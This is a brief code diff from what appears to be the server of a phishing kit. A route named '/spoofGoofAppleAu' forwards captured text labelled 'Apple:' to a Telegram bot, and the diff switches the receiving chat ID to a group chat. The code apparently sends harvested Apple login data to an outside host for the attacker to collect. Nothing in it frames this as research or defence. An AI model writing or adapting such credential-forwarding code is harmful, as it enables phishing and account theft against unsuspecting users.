@@ -8865,7 +8865,7 @@ app.post("/spoofGoofAppleAu", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 993063133,
+              chat_id: '-892767417',
               text: `Apple:\n${originalText}`,
               parse_mode: "Markdown",
             }
